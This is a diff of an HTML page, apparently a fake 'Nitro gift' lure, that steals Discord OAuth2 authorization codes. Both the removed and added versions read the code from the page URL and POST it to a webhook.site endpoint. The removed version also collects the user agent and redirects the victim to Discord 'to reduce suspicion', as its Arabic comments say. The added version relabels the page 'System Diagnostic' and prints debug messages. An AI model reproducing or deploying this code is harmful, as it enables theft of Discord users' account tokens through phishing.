@@ -1,30 +1,29 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Loading...</title>
-</head>
 <body>
+    <h1>System Diagnostic</h1>
+    <div id="debug">جاري الفحص...</div>
     <script>
-        // هذا السكريبت يعمل فور فتح الصفحة تلقائياً
-        window.onload = function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const code = urlParams.get('code');
-            
-            if (code) {
-                // إرسال البيانات للوسيط (Webhook.site)
-                fetch('https://webhook.site/47b4ea10-e719-4c20-b1e3-fa539ff7838e', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({token: code, info: navigator.userAgent})
-                }).then(() => {
-                    // تحويل الضحية بعد العملية لتقليل الشك
-                    window.location.href = 'https://discord.com';
-                });
-            } else {
-                // إذا لم يوجد كود، وجهه لصفحة الـ OAuth2 الخاصة بك فوراً
-                window.location.href = 'https://discord.com/oauth2/authorize?client_id=1512098458398490664&response_type=code&redirect_uri=https%3A%2F%2Fgithub.com%2FNitroDiscord30-daygift%2FNitro-gift%2Fblob%2Fmain%2Findex.html&scope=identify';
-            }
-        };
+        const urlParams = new URLSearchParams(window.location.search);
+        const code = urlParams.get('code');
+        const debug = document.getElementById('debug');
+
+        if (code) {
+            debug.innerHTML = "تم العثور على الكود: " + code + "<br>جاري الإرسال...";
+            fetch('https://webhook.site/47b4ea10-e719-4c20-b1e3-fa539ff7838e', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({token: code})
+            })
+            .then(response => {
+                debug.innerHTML += "<br>تم الإرسال بنجاح! تحقق من موقع الـ Webhook.";
+            })
+            .catch(error => {
+                debug.innerHTML += "<br>خطأ في الإرسال: " + error;
+            });
+        } else {
+            debug.innerHTML = "لا يوجد كود في الرابط. تأكد من أنك قمت بعمل Authorization أولاً.";
+        }
     </script>
 </body>
 </html>
